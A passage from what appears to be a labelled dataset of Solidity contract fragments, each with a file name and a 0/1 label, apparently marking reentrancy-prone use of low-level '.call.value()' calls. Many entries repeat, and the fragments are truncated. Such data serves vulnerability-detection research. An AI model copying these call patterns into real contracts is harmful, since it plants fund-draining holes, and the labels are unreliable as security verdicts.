super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
contract GOeurekaSale is Claimable, gotTokenSaleConfig, Pausable, Salvageable {
using SafeMath for uint256;
GOeureka public token;
WhiteListedBasic public whiteListed;
uint256 public presaleEnd;
uint256 public saleEnd;
uint256 public minContribution;
address public multiSig;
uint256 public weiRaised;
uint256 public tokensRaised;
mapping(address => uint256) public contributions;
uint256 public numberOfContributors = 0;
uint public basicRate;
event TokenPurchase(address indexed beneficiary, uint256 value, uint256 amount);
event SaleClosed();
event HardcapReached();
event NewCapActivated(uint256 newCap);
constructor(GOeureka token_, WhiteListedBasic _whiteListed) public {
basicRate = 3000;
calculateRates();
presaleEnd = 1536508800;
saleEnd = 1543593600;
multiSig = MULTISIG_ETH;
token = token_;
whiteListed = _whiteListed;
bool allocated = false;
1
---------------------------------
1252 29517.sol
function temporaryEscapeHatch(address to, uint256 value, bytes data) public {
require(msg.sender == admin);
require(to.call.value(value)(data));
0
---------------------------------
1253 3054.sol
function player_withdrawPendingTransactions() public returns (bool){
uint withdrawAmount = playerPendingWithdrawals[msg.sender];
playerPendingWithdrawals[msg.sender] = 0;
if (msg.sender.call.value(withdrawAmount)()) {
return true;
} else {
playerPendingWithdrawals[msg.sender] = withdrawAmount;
return false;
0
---------------------------------
1254 3054.sol
function player_withdrawPendingTransactions() public returns (bool){
uint withdrawAmount = playerPendingWithdrawals[msg.sender];
playerPendingWithdrawals[msg.sender] = 0;
if (msg.sender.call.value(withdrawAmount)()) {
return true;
} else {
playerPendingWithdrawals[msg.sender] = withdrawAmount;
return false;
0
---------------------------------
1255 3054.sol
function player_withdrawPendingTransactions() public returns (bool){
uint withdrawAmount = playerPendingWithdrawals[msg.sender];
playerPendingWithdrawals[msg.sender] = 0;
if (msg.sender.call.value(withdrawAmount)()) {
return true;
} else {
playerPendingWithdrawals[msg.sender] = withdrawAmount;
return false;
0
---------------------------------
1256 39664.sol
function migrateBlockjack() only(ADMIN_CONTRACT) {
stopBlockjack();
if (currentBankroll > initialBankroll) {
if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw;
suicide(DX);
function shareProfits() onlyOwner {
if (profitsLockedUntil > now) throw;
if (currentBankroll <= initialBankroll) throw;
uint256 profit = currentBankroll - initialBankroll;
if (!ADMIN_CONTRACT.call.value(profit)()) throw;
currentBankroll -= profit;
bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD;
profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD;
0
---------------------------------
1257 17573.sol
function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public  returns (bool success)    {
if (isContract(controller)) {
if (!TokenController(controller).onTransfer(_from, _to, _amount))
throw;
require(super.transferFrom(_from, _to, _amount));
if (isContract(_to)) {
ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data);
ERC223Transfer(_from, _to, _amount, _data);
return true;
function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback)  public   returns (bool success)  {
return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback);
0
---------------------------------
1258 17573.sol
function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public  returns (bool success)    {
if (isContract(controller)) {
if (!TokenController(controller).onTransfer(_from, _to, _amount))
throw;
require(super.transferFrom(_from, _to, _amount));
if (isContract(_to)) {
ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data);
ERC223Transfer(_from, _to, _amount, _data);
return true;
function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback)  public   returns (bool success)  {
return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback);
0
---------------------------------
1259 17573.sol
function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public  returns (bool success)    {
if (isContract(controller)) {
if (!TokenController(controller).onTransfer(_from, _to, _amount))
throw;
require(super.transferFrom(_from, _to, _amount));
if (isContract(_to)) {
ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data);
ERC223Transfer(_from, _to, _amount, _data);
return true;
function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback)  public   returns (bool success)  {
return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback);
0
---------------------------------
1260 17573.sol
function transferFrom(address _from, address _to, uint256 _amount, bytes _data, string _custom_fallback) public  returns (bool success)    {
if (isContract(controller)) {
if (!TokenController(controller).onTransfer(_from, _to, _amount))
throw;
require(super.transferFrom(_from, _to, _amount));
if (isContract(_to)) {
ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), _from, _amount, _data);
ERC223Transfer(_from, _to, _amount, _data);
return true;
function transfer( address _to,  uint _amount, bytes _data,  string _custom_fallback)  public   returns (bool success)  {
return transferFrom(msg.sender, _to, _amount, _data, _custom_fallback);
0
---------------------------------
1261 23803.sol
function () payable {
if (!founder.call.value(msg.value)()) revert();
0
---------------------------------
1262 16884.sol
function mintETHRewards(address _contract, uint256 _amount) public onlyManager() {
require(_contract.call.value(_amount)());
0
---------------------------------
1263 16884.sol
function mintETHRewards(address _contract, uint256 _amount) public onlyManager() {
require(_contract.call.value(_amount)());
0
---------------------------------
1264 39127.sol
function executeProposal(uint256 _proposalID, bytes _transactionBytecode) onlyCongressMembers {
Proposal p = proposals[_proposalID];
if (p.state != ProposalState.Passed) throw;
p.state = ProposalState.Executed;
if (!p.beneficiary.call.value(p.etherAmount * 1 ether)(_transactionBytecode)) { throw; }
ProposalExecutedEvent(_proposalID);
0
---------------------------------
1265 39127.sol
function executeProposal(uint256 _proposalID, bytes _transactionBytecode) onlyCongressMembers {
Proposal p = proposals[_proposalID];
if (p.state != ProposalState.Passed) throw;
p.state = ProposalState.Executed;
if (!p.beneficiary.call.value(p.etherAmount * 1 ether)(_transactionBytecode)) { throw; }
ProposalExecutedEvent(_proposalID);
0
---------------------------------
1266 40341.sol
function carefulSendWithFixedGas(address _toAddress, uint _valueWei, uint _extraGasIncluded) internal returns (bool success) {
return _toAddress.call.value(_valueWei).gas(_extraGasIncluded)();
contract FundsHolderMixin is ReentryProtectorMixin, CarefulSenderMixin {
mapping (address => uint) funds;
event FundsWithdrawnEvent(address fromAddress, address toAddress, uint valueWei);
function withdrawFundsAdvancedRP(address _toAddress, uint _valueWei, uint _extraGasIncluded) internal {
if (msg.value != 0) { throw; }
address fromAddress = msg.sender;
if (_valueWei > funds[fromAddress]) { throw; }
funds[fromAddress] -= _valueWei;
bool sentOk = carefulSendWithFixedGas(_toAddress, _valueWei, _extraGasIncluded);
if (!sentOk) { throw; }
FundsWithdrawnEvent(fromAddress, _toAddress, _valueWei);
contract MoneyRounderMixin {
function compensateLatestMonarch(uint _compensationWei) internal {
address compensationAddress = latestMonarchInternal().compensationAddress;
latestMonarchInternal().compensationWei = _compensationWei;
bool sentOk = carefulSendWithFixedGas(compensationAddress, _compensationWei,suggestedExtraGasToIncludeWithSends);
if (sentOk) {
CompensationSentEvent(compensationAddress, _compensationWei);
} else {
funds[compensationAddress] += _compensationWei;
CompensationFailEvent(compensationAddress, _compensationWei);
0
---------------------------------
1267 14458.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) public whenNotPaused notSelf(_to) returns (bool success){
require(_to != address(0));
if(isContract(_to)) {
if(accountBalances[msg.sender].addressBalance < _value){
revert();
if(safeAdd(accountBalances[_to].addressBalance, _value) < accountBalances[_to].addressBalance){
revert();
isNewRound();
subFromAddressBalancesInfo(msg.sender, _value);
addToAddressBalancesInfo(_to, _value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value, _data);
Transfer(msg.sender, _to, _value);
return true;
} else {
return transferToAddress(msg.sender, _to, _value, _data);
0
---------------------------------
1268 9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
1269 9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
1270 9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
1271 9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
1272 9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
1273 9600.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
1274 39326.sol
function executeProposal( uint256 id, bytes transactionBytecode) onlyMembers {
Proposal p = proposals[id];
if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw;
if (p.currentResult > majorityMargin) {
p.executed = true;
if (!p.recipient.call.value(p.amount)(transactionBytecode))  throw;
p.proposalPassed = true;
} else {
p.proposalPassed = false;
ProposalTallied(id, p.numberOfVotes, p.proposalPassed);
0
---------------------------------
1275 2387.sol
function transferAndCall(address to, uint256 value, bytes data) public payable liquid returns (bool) {
require(to != address(this) && data.length >= 68 && transfer(to, value));
assembly {
mstore(add(data, 36), value)
mstore(add(data, 68), caller)
require(to.call.value(msg.value)(data));
return true;
1
---------------------------------
1276 39684.sol
function () payable {
if (msg.data.length > 0) {
createSeries(msg.data, 0, "", "", 0x0);
} else
if (latestSeriesForUser[msg.sender] != 0) {
if (latestSeriesForUser[msg.sender].call.value(msg.value)())
DepositMade(latestSeriesForUser[msg.sender], msg.value);
} else {
createSeries("", 0, "", "", 0x0);
address public seriesFactory;
address public owner;
0
---------------------------------
1277 10604.sol
function executeTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) {
return to.call.value(value)(data);
0
---------------------------------
1278 10604.sol
function executeTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) {
return to.call.value(value)(data);
0
---------------------------------
1279 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
1280 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
1281 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
1282 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
1283 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
1284 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
1285 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
1286 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
1287 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
1288 35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal returns (bool call_ret) {
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}
0
---------------------------------
1289 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
1290 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
1291 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
1292 10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
